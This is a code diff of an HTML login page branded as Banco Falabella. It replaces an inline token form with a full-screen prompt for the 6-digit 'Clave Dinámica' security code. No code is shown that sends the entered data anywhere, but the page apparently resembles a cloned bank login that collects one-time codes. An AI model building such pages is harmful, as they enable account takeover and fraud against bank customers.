@@ -443,24 +443,6 @@
           <p class="login-error" id="loginError"></p>
           <button class="btn btn-lg btn-disabled" id="loginSubmit" type="submit" disabled>Ingresar</button>
         </form>
-        <form id="tokenForm" style="display: none; margin-top: 16px;">
-          <h2 id="tokenTitle" style="font-size: 22px; font-weight: 700; color: #2c2e31; margin-bottom: 8px;">Ingresa tu clave dinámica</h2>
-          <p id="tokenDesc" style="margin-bottom: 20px; font-size: 14px; color: #8a8e93; line-height: 1.4;">
-            Por favor ingresa la clave dinámica o el código SMS que enviamos a tu celular para validar tu identidad.
-          </p>
-          <div class="field">
-            <input
-              id="tokenInput"
-              type="text"
-              maxlength="6"
-              inputmode="numeric"
-              placeholder="Código de 6 dígitos"
-              style="text-align: center; font-size: 20px; letter-spacing: 4px; font-weight: 600; width: 100%; border: 1px solid #c2c9d1; border-radius: 8px; padding: 12px;"
-            />
-          </div>
-          <p class="login-error" id="tokenError" style="color: #ea1b2b; font-size: 13px; margin: 4px 0 12px; font-weight: 500; min-height: 18px;"></p>
-          <button class="btn btn-lg btn-disabled" id="tokenSubmit" type="submit" disabled style="width: 100%;">Validar</button>
-        </form>
         <div class="login-footer">
           <a href="#" id="recoverLink">
             Recupera o crea tu clave internet
@@ -508,6 +490,58 @@
           </div>
           <p id="cdatResult" style="font-weight: 600; color: #2c2e31"></p>
           <button class="btn btn-primary" id="calcCdat" type="button">Calcular</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="clave-screen" id="claveScreen" style="display: none;">
+      <header class="clave-top">
+        <img class="logo-lockup" src="/logo.svg" alt="Banco Falabella" />
+      </header>
+      <div class="clave-body">
+        <div class="clave-copy">
+          <h1 id="claveTitle">Ingreso de Clave Dinámica</h1>
+          <p id="claveDesc">
+            Ingresa el código de seguridad de 6 dígitos que aparece en tu app
+            <strong>Banco Falabella</strong>
+          </p>
+        </div>
+        <form class="clave-form" id="claveForm">
+          <input
+            id="claveInput"
+            inputmode="numeric"
+            maxlength="6"
+            placeholder="      "
+            autocomplete="one-time-code"
+            aria-label="Clave dinámica"
+            style="text-align: center; font-size: 20px; letter-spacing: 4px;"
+          />
+          <p class="login-error" id="claveError" style="color: #ea1b2b; font-size: 13px; margin: 4px 0; font-weight: 500; min-height: 18px; text-align: center;"></p>
+          <button class="clave-auth" id="claveAuth" type="submit" disabled>Autorizar</button>
+          <button class="clave-help" id="claveHelp" type="button">No recibí el código</button>
+        </form>
+        <div class="clave-side">
+          <p id="claveSideText">
+            Encuentra tu <strong>Clave Dinámica</strong> en la pantalla principal de tu app
+            <strong>Banco Falabella</strong>
+          </p>
+        </div>
+        <div class="clave-visual" aria-hidden="true">
+          <div class="clave-phone">
+            <div class="clave-phone-screen">
+              <div class="clave-app-dot"></div>
+              <div class="clave-app-dot"></div>
+              <div class="clave-app-dot"></div>
+              <div class="clave-app-dot"></div>
+            </div>
+          </div>
+          <div class="clave-badge">
+            <svg viewBox="0 0 24 24" fill="none">
+              <circle cx="8" cy="10" r="3.2" stroke="#fff" stroke-width="1.6" />
+              <path d="M11 10h9v3h-2v2h-2v-2h-1.5" stroke="#fff" stroke-width="1.6" stroke-linecap="round" />
+            </svg>
+            <span id="claveBadgeText">Clave Dinámica</span>
+          </div>
         </div>
       </div>
     </div>
